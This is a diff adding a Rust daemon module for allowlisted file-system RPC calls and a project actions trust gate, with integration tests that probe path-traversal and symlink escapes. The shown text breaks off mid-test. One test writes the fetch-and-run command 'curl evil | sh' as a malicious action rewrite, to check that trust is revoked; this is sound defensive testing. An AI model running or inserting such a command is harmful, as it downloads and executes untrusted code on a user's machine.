@@ -1,0 +1,1025 @@
+//! `/api/rpc` bodies for WP-19 slice 5a: the rest of the fs family that can
+//! be served honestly (`fs_kind`, `fs_mime`, `fs_search`, `fs_rename`) and
+//! the actions / keybindings file layer with its project-trust record
+//! (`actions_read_files`, `actions_write`, `keybindings_write`,
+//! `actions_trust_status`, `actions_trust_grant`, `actions_trust_revoke`).
+//!
+//! Same house pattern as `rpc_local` / `rpc_shell`: the arm *names* stay in
+//! `rpc.rs`'s dispatch `match` (the parity ratchet reads them there) and
+//! delegate here; every body calls the core the desktop `#[tauri::command]`
+//! calls (`server::shared::{fs, actions}`) and returns the same serialized
+//! type, so the JSON shapes are the desktop's by construction. Arguments are
+//! decoded by `rpc_shell::targ` (camelCase as `tauri-cmd.ts` sends them, or
+//! snake_case; `null` = absent for an `Option`).
+//!
+//! **Paths.** Every caller path goes through the daemon's `PathGuard`, which
+//! resolves it exactly as the desktop's `resolve_allowlisted` does and checks
+//! the canonical result against the fs allowlist (`<data-dir>/fs_roots.json`)
+//! — the boundary the served `fs_read` / `fs_write` use. The actions arms take
+//! no path: they read and write `<home>/.ikenga/{actions,keybindings}.json`
+//! (the daemon PROCESS's home — the same single-user seam as the personal
+//! `settings.json`, G-PRINCIPAL topology B) and `<root>/.ikenga/…` for the
+//! resolved project, whose root must be inside the allowlist (the manager's
+//! `RootGuard`). The shared scope layer refuses a symlinked file or
+//! `.ikenga/` directory on both surfaces.
+//!
+//! **No events.** The desktop manager emits `actions://changed` from its
+//! watcher and on a trust grant / revoke. The daemon's manager has no
+//! notifier (there is no event channel — the web transport's `listen()` is a
+//! no-op), so it starts no watcher and emits nothing; the browser re-reads.
+//!
+//! **Trust.** A remote write cannot bypass the trust gate: `actions_write` /
+//! `keybindings_write` never touch the trust record (see
+//! `server::shared::actions`), which lives in `<data-dir>/actions-trust.json`,
+//! user-side, never under the project. A written project file is untrusted /
+//! held until `actions_trust_grant` pins the hash of the document in force,
+//! and a grant with a stale hash is refused whole — the same gate the desktop
+//! Trust dialog goes through. The daemon executes no action (`action_exec`
+//! stays allowlisted), so trust here only decides what the browser shows.
+
+use std::path::{Path, PathBuf};
+use std::sync::Arc;
+
+use serde_json::Value;
+
+use super::rpc::RpcResponse;
+use super::rpc_local::respond;
+use super::rpc_shell::{targ, PathGuard};
+use super::shared::actions::schema::FileKind;
+use super::shared::actions::{
+    ActionsManager, ActionsWriteResult, RootGuard, TrustGrantRequest, TrustRevokeRequest,
+};
+use super::shared::fs as shared_fs;
+use super::shared::settings::SettingsScope;
+use super::AppState;
+
+const NO_DATA_DIR_ACTIONS: &str =
+    "no actions store: the daemon was started without --data-dir, so there is no ikenga.db (projects) or actions-trust.json to open";
+const NO_HOME_ACTIONS: &str =
+    "no actions store: the daemon has no HOME in its environment, so there is no ~/.ikenga/actions.json to resolve";
+
+// ─── fs ──────────────────────────────────────────────────────────────────────
+
+/// `state.path_guard` as the shared cores' resolver.
+fn resolver(state: &AppState) -> impl Fn(&str) -> Result<PathBuf, String> + Sync + '_ {
+    move |p: &str| state.path_guard.resolve(p)
+}
+
+/// The desktop answers `"missing"` for an allowlist-rejected path, and so
+/// does this — but only once the allowlist exists: without `--data-dir`
+/// every path would read as missing, which is an answer, not the truth.
+pub(super) async fn fs_kind(state: &AppState, args: &Value) -> RpcResponse {
+    let r = async {
+        let path: String = targ(args, &["path"])?;
+        state.path_guard.ready()?;
+        Ok(shared_fs::kind(&resolver(state), &path).await)
+    }
+    .await;
+    respond("fs_kind", r)
+}
+
+pub(super) fn fs_mime(state: &AppState, args: &Value) -> RpcResponse {
+    let r = (|| {
+        let path: String = targ(args, &["path"])?;
+        state.path_guard.ready()?;
+        shared_fs::mime(&resolver(state), &path)
+    })();
+    respond("fs_mime", r)
+}
+
+/// The root must be inside the allowlist; the walk never follows a symlinked
+/// directory out of it (see `shared::fs::search`). Same caps as the desktop:
+/// `limit` (default 500, minimum 1), early stop with `truncated`.
+pub(super) async fn fs_search(state: &AppState, args: &Value) -> RpcResponse {
+    let r = async {
+        let root: String = targ(args, &["root"])?;
+        let query: String = targ(args, &["query"])?;
+        let show_hidden: bool = targ(args, &["showHidden", "show_hidden"])?;
+        let show_ignored: bool = targ(args, &["showIgnored", "show_ignored"])?;
+        let limit: Option<usize> = targ(args, &["limit"])?;
+        state.path_guard.ready()?;
+        shared_fs::search(
+            &resolver(state),
+            &root,
+            &query,
+            show_hidden,
+            show_ignored,
+            limit,
+        )
+        .await
+    }
+    .await;
+    respond("fs_search", r)
+}
+
+/// Both ends are resolved through the allowlist; `toName` is a bare basename.
+pub(super) async fn fs_rename(state: &AppState, args: &Value) -> RpcResponse {
+    let r = async {
+        let from: String = targ(args, &["from"])?;
+        let to_name: String = targ(args, &["toName", "to_name"])?;
+        state.path_guard.ready()?;
+        shared_fs::rename(&resolver(state), &from, &to_name).await
+    }
+    .await;
+    respond("fs_rename", r)
+}
+
+// ─── actions / keybindings ───────────────────────────────────────────────────
+
+/// The daemon's `ActionsManager`: the desktop's, with no notifier (no
+/// watcher, no emits), the trust record in `<data-dir>`, the personal files
+/// under `home`, and every project root checked against `guard`.
+pub(crate) fn daemon_actions(
+    db: Arc<crate::db::PaDb>,
+    data_dir: &Path,
+    home: PathBuf,
+    guard: PathGuard,
+) -> ActionsManager {
+    let root_guard: RootGuard = Arc::new(move |root: &Path| {
+        guard.check_maybe_missing(root).map_err(|e| {
+            format!(
+                "the project root is outside the daemon's fs allowlist: {} ({e})",
+                root.display()
+            )
+        })
+    });
+    ActionsManager::with_notifier(None, db, data_dir, home).with_root_guard(root_guard)
+}
+
+fn actions(state: &AppState) -> Result<&ActionsManager, String> {
+    match &state.actions {
+        Some(m) => Ok(m),
+        None if state.config.data_dir.is_none() || state.pa_db.is_none() => {
+            Err(NO_DATA_DIR_ACTIONS.to_string())
+        }
+        None => Err(NO_HOME_ACTIONS.to_string()),
+    }
+}
+
+pub(super) async fn actions_read_files(state: &AppState, args: &Value) -> RpcResponse {
+    let r = async {
+        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
+        actions(state)?.read_files(project_id.as_deref()).await
+    }
+    .await;
+    respond("actions_read_files", r)
+}
+
+async fn write(
+    state: &AppState,
+    kind: FileKind,
+    args: &Value,
+) -> Result<ActionsWriteResult, String> {
+    let scope: String = targ(args, &["scope"])?;
+    // Tauri's `document: Value` takes JSON null as a value (which validation
+    // then refuses), so read it raw rather than through `targ`.
+    let document = args
+        .get("document")
+        .cloned()
+        .ok_or_else(|| "`document` is required".to_string())?;
+    let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
+    let manager = actions(state)?;
+    let scope = SettingsScope::parse(&scope)?;
+    manager
+        .write(kind, scope, project_id.as_deref(), document)
+        .await
+}
+
+pub(super) async fn actions_write(state: &AppState, args: &Value) -> RpcResponse {
+    respond("actions_write", write(state, FileKind::Actions, args).await)
+}
+
+/// A project `scope: "os"` rule is refused with `E_OS_LAYER` (DEC-60), by the
+/// same validation the desktop runs.
+pub(super) async fn keybindings_write(state: &AppState, args: &Value) -> RpcResponse {
+    respond(
+        "keybindings_write",
+        write(state, FileKind::Keybindings, args).await,
+    )
+}
+
+pub(super) async fn actions_trust_status(state: &AppState, args: &Value) -> RpcResponse {
+    let r = async {
+        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
+        actions(state)?.trust_status(project_id.as_deref()).await
+    }
+    .await;
+    respond("actions_trust_status", r)
+}
+
+/// `request` is the desktop's `TrustGrantRequest` (camelCase fields — Tauri
+/// renames only top-level parameter names). Refused whole if any hash is not
+/// the one in force now.
+pub(super) async fn actions_trust_grant(state: &AppState, args: &Value) -> RpcResponse {
+    let r = async {
+        let request: TrustGrantRequest = targ(args, &["request"])?;
+        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
+        actions(state)?
+            .trust_grant(project_id.as_deref(), request)
+            .await
+    }
+    .await;
+    respond("actions_trust_grant", r)
+}
+
+/// An absent / empty `request` revokes everything the project has.
+pub(super) async fn actions_trust_revoke(state: &AppState, args: &Value) -> RpcResponse {
+    let r = async {
+        let request: Option<TrustRevokeRequest> = targ(args, &["request"])?;
+        let project_id: Option<String> = targ(args, &["projectId", "project_id"])?;
+        actions(state)?
+            .trust_revoke(project_id.as_deref(), request.unwrap_or_default())
+            .await
+    }
+    .await;
+    respond("actions_trust_revoke", r)
+}
+
+#[cfg(test)]
+mod tests {
+    //! House pattern (see `rpc_shell`'s tests): a literal `ServerConfig` →
+    //! the router → `oneshot` POST `/api/rpc` with the bearer token. The home
+    //! and the fs allowlist are pinned to temp dirs, so nothing here touches
+    //! the real `~/.ikenga` or installs the process-global `fs_roots`.
+
+    use std::path::{Path, PathBuf};
+    use std::sync::Arc;
+
+    use axum::body::Body;
+    use axum::http::StatusCode;
+    use axum::Router;
+    use serde_json::{json, Value};
+    use tower::ServiceExt;
+
+    use super::PathGuard;
+    use crate::db::PaDb;
+    use crate::engines::EngineRegistry;
+    use crate::executor::ExecutorTier;
+    use crate::pty::PtyManager;
+    use crate::server::shared::actions::trust::{run_hash, TRUST_FILE_NAME};
+    use crate::server::shared::actions::ActionsManager;
+    use crate::server::shared::fs as shared_fs;
+    use crate::server::shared::projects::{self, CreateArgs};
+    use crate::server::{router_with, ServerConfig};
+
+    fn config(data_dir: Option<PathBuf>) -> ServerConfig {
+        ServerConfig {
+            host: "127.0.0.1".into(),
+            port: 0,
+            static_dir: PathBuf::from("no-spa-here"),
+            pkgs_dir: None,
+            data_dir,
+            auth_token: Some("tok".into()),
+            allowed_origins: vec![],
+            idle_timeout_secs: None,
+            executor_tier: ExecutorTier::T0,
+        }
+    }
+
+    /// A daemon with `--data-dir`, a home, and an fs allowlist of exactly
+    /// `allowed/`. `outside/` is a sibling the allowlist does not cover.
+    struct Daemon {
+        _tmp: tempfile::TempDir,
+        data: PathBuf,
+        home: PathBuf,
+        allowed: PathBuf,
+        outside: PathBuf,
+        db: Arc<PaDb>,
+        guard: PathGuard,
+        router: Router,
+    }
+
+    fn daemon_with_home(with_home: bool) -> Daemon {
+        let tmp = tempfile::tempdir().unwrap();
+        let root = tmp.path().canonicalize().unwrap();
+        let (data, home) = (root.join("data"), root.join("home"));
+        let (allowed, outside) = (root.join("allowed"), root.join("outside"));
+        for d in [&data, &home, &allowed, &outside] {
+            std::fs::create_dir_all(d).unwrap();
+        }
+        let roots_file = root.join("fs_roots.json");
+        std::fs::write(
+            &roots_file,
+            json!({ "roots": [allowed.to_string_lossy()] }).to_string(),
+        )
+        .unwrap();
+        let roots = crate::fs_roots::FsRoots::load(roots_file).unwrap();
+        let guard = PathGuard::Roots(Arc::new(roots));
+        let db = Arc::new(PaDb::new(data.join("ikenga.db")));
+        let router = router_with(
+            config(Some(data.clone())),
+            Arc::new(PtyManager::new()),
+            Arc::new(EngineRegistry::new()),
+            Some(db.clone()),
+            None,
+            with_home.then(|| home.clone()),
+            guard.clone(),
+        );
+        Daemon {
+            _tmp: tmp,
+            data,
+            home,
+            allowed,
+            outside,
+            db,
+            guard,
+            router,
+        }
+    }
+
+    fn daemon() -> Daemon {
+        daemon_with_home(true)
+    }
+
+    /// No `--data-dir` (so no `PaDb`, no allowlist, no actions store).
+    fn bare() -> Router {
+        router_with(
+            config(None),
+            Arc::new(PtyManager::new()),
+            Arc::new(EngineRegistry::new()),
+            None,
+            None,
+            None,
+            PathGuard::Allowlist,
+        )
+    }
+
+    async fn rpc(router: &Router, cmd: &str, args: Value) -> Value {
+        let res = router
+            .clone()
+            .oneshot(
+                axum::http::Request::builder()
+                    .method("POST")
+                    .uri("/api/rpc")
+                    .header("authorization", "Bearer tok")
+                    .header("content-type", "application/json")
+                    .body(Body::from(json!({ "cmd": cmd, "args": args }).to_string()))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(res.status(), StatusCode::OK);
+        let bytes = axum::body::to_bytes(res.into_body(), usize::MAX)
+            .await
+            .unwrap();
+        serde_json::from_slice(&bytes).unwrap()
+    }
+
+    async fn ok(router: &Router, cmd: &str, args: Value) -> Value {
+        let res = rpc(router, cmd, args.clone()).await;
+        assert_eq!(res["ok"], true, "{cmd} {args} → {res}");
+        res.get("data").cloned().unwrap_or(Value::Null)
+    }
+
+    async fn err(router: &Router, cmd: &str, args: Value) -> String {
+        let res = rpc(router, cmd, args.clone()).await;
+        assert_eq!(res["ok"], false, "{cmd} {args} should fail → {res}");
+        res["error"].as_str().unwrap().to_string()
+    }
+
+    fn s(p: &Path) -> String {
+        p.to_string_lossy().into_owned()
+    }
+
+    #[cfg(unix)]
+    fn symlink(target: &Path, link: &Path) {
+        std::os::unix::fs::symlink(target, link).unwrap();
+    }
+
+    // ── no data dir / no home ───────────────────────────────────────────────
+
+    #[tokio::test]
+    async fn every_arm_without_data_dir_names_the_flag() {
+        let r = bare();
+        for (cmd, args) in [
+            ("fs_kind", json!({ "path": "/tmp" })),
+            ("fs_mime", json!({ "path": "/tmp/a.md" })),
+            (
+                "fs_search",
+                json!({ "root": "/tmp", "query": "a", "showHidden": false, "showIgnored": false }),
+            ),
+            ("fs_rename", json!({ "from": "/tmp/a", "toName": "b" })),
+            ("actions_read_files", json!({})),
+            (
+                "actions_write",
+                json!({ "scope": "personal", "document": { "version": 1 } }),
+            ),
+            (
+                "keybindings_write",
+                json!({ "scope": "personal", "document": { "version": 1 } }),
+            ),
+            ("actions_trust_status", json!({})),
+            ("actions_trust_grant", json!({ "request": {} })),
+            ("actions_trust_revoke", json!({})),
+        ] {
+            let e = err(&r, cmd, args).await;
+            assert!(e.contains("--data-dir"), "{cmd}: {e}");
+            assert!(e.starts_with(&format!("{cmd}: ")), "{cmd}: {e}");
+        }
+    }
+
+    #[tokio::test]
+    async fn actions_arms_without_a_home_say_so() {
+        let d = daemon_with_home(false);
+        for cmd in ["actions_read_files", "actions_trust_status"] {
+            let e = err(&d.router, cmd, json!({})).await;
+            assert!(e.contains("no HOME"), "{cmd}: {e}");
+        }
+        // The fs arms need no home.
+        assert_eq!(
+            ok(&d.router, "fs_kind", json!({ "path": s(&d.allowed) })).await,
+            "dir"
+        );
+    }
+
+    // ── fs_kind / fs_mime ──────────────────────────────────────────────────
+
+    #[tokio::test]
+    async fn fs_kind_answers_the_desktop_kinds_and_missing_for_refusals() {
+        let d = daemon();
+        let r = &d.router;
+        std::fs::write(d.allowed.join("a.txt"), b"a").unwrap();
+        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();
+
+        assert_eq!(
+            ok(r, "fs_kind", json!({ "path": s(&d.allowed) })).await,
+            "dir"
+        );
+        let file = s(&d.allowed.join("a.txt"));
+        assert_eq!(ok(r, "fs_kind", json!({ "path": file })).await, "file");
+        let gone = s(&d.allowed.join("gone.txt"));
+        assert_eq!(ok(r, "fs_kind", json!({ "path": gone })).await, "missing");
+        // Shape parity with the shared core the desktop command calls.
+        let direct = shared_fs::kind(&|p: &str| d.guard.resolve(p), &file).await;
+        assert_eq!(ok(r, "fs_kind", json!({ "path": file })).await, direct);
+
+        // Refusals fold into "missing", as on the desktop — nothing leaks.
+        for path in [
+            s(&d.outside.join("secret.txt")),
+            format!("{}/../outside/secret.txt", s(&d.allowed)),
+        ] {
+            assert_eq!(ok(r, "fs_kind", json!({ "path": path })).await, "missing");
+        }
+        #[cfg(unix)]
+        {
+            symlink(&d.outside, &d.allowed.join("escape"));
+            let via = s(&d.allowed.join("escape/secret.txt"));
+            assert_eq!(ok(r, "fs_kind", json!({ "path": via })).await, "missing");
+            let dir = s(&d.allowed.join("escape"));
+            assert_eq!(ok(r, "fs_kind", json!({ "path": dir })).await, "missing");
+        }
+        let e = err(r, "fs_kind", json!({})).await;
+        assert!(e.contains("`path` is required"), "{e}");
+    }
+
+    #[tokio::test]
+    async fn fs_mime_needs_an_allowlisted_path_not_an_existing_one() {
+        let d = daemon();
+        let r = &d.router;
+        let md = s(&d.allowed.join("notes.md"));
+        let mime = ok(r, "fs_mime", json!({ "path": md })).await;
+        let direct = shared_fs::mime(&|p: &str| d.guard.resolve(p), &md).unwrap();
+        assert_eq!(mime, json!(direct));
+        assert_eq!(mime, "text/markdown");
+        assert_eq!(
+            ok(r, "fs_mime", json!({ "path": s(&d.allowed.join("x.bin")) })).await,
+            "application/octet-stream"
+        );
+
+        let e = err(r, "fs_mime", json!({ "path": s(&d.outside.join("a.md")) })).await;
+        assert!(e.contains("outside allowlist"), "{e}");
+        let dotdot = format!("{}/../outside/a.md", s(&d.allowed));
+        let e = err(r, "fs_mime", json!({ "path": dotdot })).await;
+        assert!(e.contains("outside allowlist"), "{e}");
+        #[cfg(unix)]
+        {
+            symlink(&d.outside, &d.allowed.join("escape"));
+            let via = s(&d.allowed.join("escape/a.md"));
+            let e = err(r, "fs_mime", json!({ "path": via })).await;
+            assert!(e.contains("outside allowlist"), "{e}");
+        }
+    }
+
+    // ── fs_search ──────────────────────────────────────────────────────────
+
+    #[tokio::test]
+    async fn fs_search_stays_inside_the_allowlisted_root() {
+        let d = daemon();
+        let r = &d.router;
+        let a = &d.allowed;
+        std::fs::create_dir_all(a.join("sub/deeper")).unwrap();
+        std::fs::create_dir_all(a.join("node_modules")).unwrap();
+        std::fs::write(a.join("report.md"), b"").unwrap();
+        std::fs::write(a.join("sub/deeper/Report-2.md"), b"").unwrap();
+        std::fs::write(a.join(".report-hidden"), b"").unwrap();
+        std::fs::write(a.join("node_modules/report.js"), b"").unwrap();
+        std::fs::write(d.outside.join("report-secret.md"), b"").unwrap();
+        #[cfg(unix)]
+        symlink(&d.outside, &a.join("linked"));
+
+        let camel = ok(
+            r,
+            "fs_search",
+            json!({ "root": s(a), "query": "REPORT", "showHidden": false, "showIgnored": false }),
+        )
+        .await;
+        let snake = ok(
+            r,
+            "fs_search",
+            json!({ "root": s(a), "query": "REPORT", "show_hidden": false, "show_ignored": false, "limit": null }),
+        )
+        .await;
+        assert_eq!(camel, snake);
+        let direct = shared_fs::search(
+            &|p: &str| d.guard.resolve(p),
+            &s(a),
+            "REPORT",
+            false,
+            false,
+            None,
+        )
+        .await
+        .unwrap();
+        assert_eq!(camel, serde_json::to_value(&direct).unwrap());
+        let mut hits: Vec<String> = serde_json::from_value(camel["matches"].clone()).unwrap();
+        hits.sort();
+        assert_eq!(
+            hits,
+            vec![
+                s(&a.join("report.md")),
+                s(&a.join("sub/deeper/Report-2.md"))
+            ]
+        );
+        assert_eq!(camel["truncated"], false);
+        // The symlinked directory is not descended: nothing from outside.
+        assert!(!hits.iter().any(|h| h.contains("secret")));
+
+        let all = ok(
+            r,
+            "fs_search",
+            json!({ "root": s(a), "query": "report", "showHidden": true, "showIgnored": true }),
+        )
+        .await;
+        assert_eq!(all["matches"].as_array().unwrap().len(), 4);
+        // The desktop's cap: `limit` stops the walk early.
+        let capped = ok(
+            r,
+            "fs_search",
+            json!({ "root": s(a), "query": "report", "showHidden": true, "showIgnored": true, "limit": 1 }),
+        )
+        .await;
+        assert_eq!(capped["matches"].as_array().unwrap().len(), 1);
+        assert_eq!(capped["truncated"], true);
+
+        for root in [s(&d.outside), format!("{}/../outside", s(a))] {
+            let e = err(
+                r,
+                "fs_search",
+                json!({ "root": root, "query": "report", "showHidden": true, "showIgnored": true }),
+            )
+            .await;
+            assert!(e.contains("outside allowlist"), "{e}");
+        }
+        #[cfg(unix)]
+        {
+            let e = err(
+                r,
+                "fs_search",
+                json!({ "root": s(&a.join("linked")), "query": "report", "showHidden": true, "showIgnored": true }),
+            )
+            .await;
+            assert!(e.contains("outside allowlist"), "{e}");
+        }
+        let e = err(r, "fs_search", json!({ "root": s(a), "query": "x" })).await;
+        assert!(e.contains("`showHidden` is required"), "{e}");
+    }
+
+    // ── fs_rename ──────────────────────────────────────────────────────────
+
+    #[tokio::test]
+    async fn fs_rename_keeps_both_ends_inside_the_allowlist() {
+        let d = daemon();
+        let r = &d.router;
+        let a = &d.allowed;
+        std::fs::write(a.join("one.txt"), b"1").unwrap();
+
+        let dest = ok(
+            r,
+            "fs_rename",
+            json!({ "from": s(&a.join("one.txt")), "toName": "two.txt" }),
+        )
+        .await;
+        assert_eq!(dest, s(&a.join("two.txt")));
+        assert!(!a.join("one.txt").exists());
+        let dest = ok(
+            r,
+            "fs_rename",
+            json!({ "from": s(&a.join("two.txt")), "to_name": "three.txt" }),
+        )
+        .await;
+        assert_eq!(dest, s(&a.join("three.txt")));
+        assert_eq!(std::fs::read(a.join("three.txt")).unwrap(), b"1");
+
+        // Destination exists / bad names: the desktop's refusals.
+        std::fs::write(a.join("taken.txt"), b"t").unwrap();
+        let e = err(
+            r,
+            "fs_rename",
+            json!({ "from": s(&a.join("three.txt")), "toName": "taken.txt" }),
+        )
+        .await;
+        assert!(e.contains("destination exists"), "{e}");
+        for bad in ["", "x/y", "..\\x"] {
+            let e = err(
+                r,
+                "fs_rename",
+                json!({ "from": s(&a.join("three.txt")), "toName": bad }),
+            )
+            .await;
+            assert!(e.contains("invalid name"), "{bad:?}: {e}");
+        }
+        // `..` as the new name climbs to the root's parent — outside.
+        let e = err(
+            r,
+            "fs_rename",
+            json!({ "from": s(&a.join("three.txt")), "toName": ".." }),
+        )
+        .await;
+        assert!(e.contains("outside allowlist"), "{e}");
+
+        // Sources outside, via `..`, or via a symlink are refused and left.
+        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();
+        for from in [
+            s(&d.outside.join("secret.txt")),
+            format!("{}/../outside/secret.txt", s(a)),
+        ] {
+            let e = err(r, "fs_rename", json!({ "from": from, "toName": "x.txt" })).await;
+            assert!(e.contains("outside allowlist"), "{e}");
+        }
+        #[cfg(unix)]
+        {
+            symlink(&d.outside, &a.join("escape"));
+            let via = s(&a.join("escape/secret.txt"));
+            let e = err(r, "fs_rename", json!({ "from": via, "toName": "x.txt" })).await;
+            assert!(e.contains("outside allowlist"), "{e}");
+        }
+        assert!(d.outside.join("secret.txt").exists());
+        assert!(!d.outside.join("x.txt").exists());
+        assert!(a.join("three.txt").exists());
+    }
+
+    // ── actions / keybindings ───────────────────────────────────────────────
+
+    async fn project(d: &Daemon, id: &str, root: &Path) {
+        let pool = d.db.ensure_pool().await.unwrap();
+        projects::create_project(
+            &pool,
+            CreateArgs {
+                id: id.into(),
+                display_name: id.into(),
+                root_path: Some(s(root)),
+                icon: None,
+                color: None,
+                description: None,
+            },
+        )
+        .await
+        .unwrap();
+    }
+
+    fn shell_actions(command: &str) -> Value {
+        json!({
+            "version": 1,
+            "actions": [{
+                "id": "build",
+                "name": "Build",
+                "run": { "kind": "shell", "command": command },
+                "scope": "project"
+            }]
+        })
+    }
+
+    fn bindings(key: &str) -> Value {
+        json!({ "version": 1, "bindings": [ { "key": key, "command": "build" } ] })
+    }
+
+    fn direct_manager(d: &Daemon) -> ActionsManager {
+        ActionsManager::with_notifier(None, d.db.clone(), &d.data, d.home.clone())
+    }
+
+    #[tokio::test]
+    async fn actions_write_then_read_round_trips_in_the_desktop_shape() {
+        let d = daemon();
+        let r = &d.router;
+        let root = d.allowed.join("proj");
+        std::fs::create_dir_all(&root).unwrap();
+        project(&d, "proj", &root).await;
+
+        let personal = json!({ "version": 1, "actions": [
+            { "id": "ask", "name": "Ask", "scope": "personal", "run": { "kind": "chi", "target": "new", "prompt": "x" } }
+        ]});
+        let w = ok(
+            r,
+            "actions_write",
+            json!({ "scope": "personal", "document": personal }),
+        )
+        .await;
+        assert_eq!(w["written"], true, "{w}");
+        assert_eq!(w["kind"], "actions");
+        assert_eq!(w["path"], s(&d.home.join(".ikenga/actions.json")));
+
+        let w = ok(
+            r,
+            "actions_write",
+            json!({ "scope": "project", "document": shell_actions("make"), "projectId": "proj" }),
+        )
+        .await;
+        assert_eq!(w["written"], true, "{w}");
+        assert_eq!(w["path"], s(&root.join(".ikenga/actions.json")));
+        let w = ok(
+            r,
+            "keybindings_write",
+            json!({ "scope": "project", "document": bindings("mod+b"), "project_id": "proj" }),
+        )
+        .await;
+        assert_eq!(w["written"], true, "{w}");
+        assert_eq!(w["kind"], "keybindings");
+
+        let camel = ok(r, "actions_read_files", json!({ "projectId": "proj" })).await;
+        let snake = ok(r, "actions_read_files", json!({ "project_id": "proj" })).await;
+        assert_eq!(camel, snake);
+        assert_eq!(
+            camel["personal"]["actions"]["document"]["actions"][0]["id"],
+            "ask"
+        );
+        assert_eq!(
+            camel["project"]["actions"]["document"]["actions"][0]["id"],
+            "build"
+        );
+        assert_eq!(
+            camel["project"]["keybindings"]["document"]["bindings"][0]["key"],
+            "mod+b"
+        );
+        assert_eq!(camel["projectRoot"], s(&root));
+        // Written project keybindings are held until trusted.
+        assert_eq!(camel["projectKeybindingsTrust"]["state"], "untrusted");
+
+        // Shape parity: the same core the desktop command calls, over the same
+        // db / home / data dir, serializes identically.
+        let direct = direct_manager(&d).read_files(Some("proj")).await.unwrap();
+        assert_eq!(camel, serde_json::to_value(&direct).unwrap());
+
+        // Validation refusals are the desktop's: nothing written.
+        let before = std::fs::read(root.join(".ikenga/keybindings.json")).unwrap();
+        let os_rule = json!({ "version": 1, "bindings": [
+            { "key": "alt+space", "command": "os.summon", "scope": "os" }
+        ]});
+        let w = ok(
+            r,
+            "keybindings_write",
+            json!({ "scope": "project", "document": os_rule, "projectId": "proj" }),
+        )
+        .await;
+        assert_eq!(w["written"], false);
+        assert_eq!(w["validation"]["errors"][0]["code"], "E_OS_LAYER");
+        assert_eq!(
+            std::fs::read(root.join(".ikenga/keybindings.json")).unwrap(),
+            before
+        );
+        let w = ok(
+            r,
+            "actions_write",
+            json!({ "scope": "personal", "document": null }),
+        )
+        .await;
+        assert_eq!(w["written"], false, "{w}");
+        let e = err(r, "actions_write", json!({ "scope": "personal" })).await;
+        assert!(e.contains("`document` is required"), "{e}");
+        let e = err(
+            r,
+            "actions_write",
+            json!({ "scope": "everywhere", "document": personal }),
+        )
+        .await;
+        assert!(e.starts_with("actions_write: "), "{e}");
+    }
+
+    /// The invariant: a remote write never changes trust. A written gated
+    /// project action is untrusted until granted; a granted one that is then
+    /// rewritten over RPC is `changed` (re-asks), and a grant must name the
+    /// hash in force now.
+    #[tokio::test]
+    async fn a_remote_write_never_grants_trust() {
+        let d = daemon();
+        let r = &d.router;
+        let root = d.allowed.join("proj");
+        std::fs::create_dir_all(&root).unwrap();
+        project(&d, "proj", &root).await;
+        let pid = json!("proj");
+
+        ok(
+            r,
+            "actions_write",
+            json!({ "scope": "project", "document": shell_actions("make"), "projectId": pid }),
+        )
+        .await;
+        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
+        assert_eq!(status["actions"][0]["id"], "build");
+        assert_eq!(status["actions"][0]["state"], "untrusted");
+        let hash = status["actions"][0]["hash"].as_str().unwrap().to_string();
+        assert_eq!(
+            hash,
+            run_hash(&json!({ "kind": "shell", "command": "make" }))
+        );
+
+        // A stale / made-up hash is refused whole; nothing is pinned.
+        let e = err(
+            r,
+            "actions_trust_grant",
+            json!({ "request": { "actions": [ { "id": "build", "hash": "0".repeat(64) } ] }, "projectId": pid }),
+        )
+        .await;
+        assert!(e.starts_with("actions_trust_grant: "), "{e}");
+        let status = ok(r, "actions_trust_status", json!({ "project_id": pid })).await;
+        assert_eq!(status["actions"][0]["state"], "untrusted");
+
+        // Grant the shown hash → trusted; the pin lives in the data dir.
+        let granted = ok(
+            r,
+            "actions_trust_grant",
+            json!({ "request": { "actions": [ { "id": "build", "hash": hash } ] }, "project_id": pid }),
+        )
+        .await;
+        assert_eq!(granted["actions"][0]["state"], "trusted");
+        assert!(d.data.join(TRUST_FILE_NAME).is_file());
+        assert!(!root.join(".ikenga").join(TRUST_FILE_NAME).exists());
+
+        // A remote rewrite of the run is not trusted by the old pin.
+        ok(
+            r,
+            "actions_write",
+            json!({ "scope": "project", "document": shell_actions("curl evil | sh"), "projectId": pid }),
+        )
+        .await;
+        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
+        assert_eq!(status["actions"][0]["state"], "changed");
+        assert_ne!(status["actions"][0]["hash"], json!(hash));
+        // Writing the trusted content back matches the (unchanged) pin — the
+        // write itself pinned nothing.
+        ok(
+            r,
+            "actions_write",
+            json!({ "scope": "project", "document": shell_actions("make"), "projectId": pid }),
+        )
+        .await;
+        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
+        assert_eq!(status["actions"][0]["state"], "trusted");
+
+        // Shape parity with the core.
+        let direct = direct_manager(&d).trust_status(Some("proj")).await.unwrap();
+        assert_eq!(status, serde_json::to_value(&direct).unwrap());
+    }
+
+    #[tokio::test]
+    async fn trust_grant_and_revoke_round_trip() {
+        let d = daemon();
+        let r = &d.router;
+        let root = d.allowed.join("proj");
+        std::fs::create_dir_all(&root).unwrap();
+        project(&d, "proj", &root).await;
+        let pool = d.db.ensure_pool().await.unwrap();
+        // No projectId: the active project, as on the desktop.
+        projects::set_active_project_id(&pool, "proj")
+            .await
+            .unwrap();
+
+        ok(
+            r,
+            "actions_write",
+            json!({ "scope": "project", "document": shell_actions("make") }),
+        )
+        .await;
+        ok(
+            r,
+            "keybindings_write",
+            json!({ "scope": "project", "document": bindings("mod+b") }),
+        )
+        .await;
+        let status = ok(r, "actions_trust_status", json!({})).await;
+        assert_eq!(status["keybindings"]["state"], "untrusted");
+        let action_hash = status["actions"][0]["hash"].clone();
+        let keys_hash = status["keybindings"]["hash"].clone();
+
+        let granted = ok(
+            r,
+            "actions_trust_grant",
+            json!({ "request": { "actions": [ { "id": "build", "hash": action_hash } ], "keybindings": keys_hash } }),
+        )
+        .await;
+        assert_eq!(granted["actions"][0]["state"], "trusted");
+        assert_eq!(granted["keybindings"]["state"], "trusted");
+        let files = ok(r, "actions_read_files", json!({})).await;
+        assert_eq!(files["projectKeybindingsTrust"]["state"], "trusted");
+
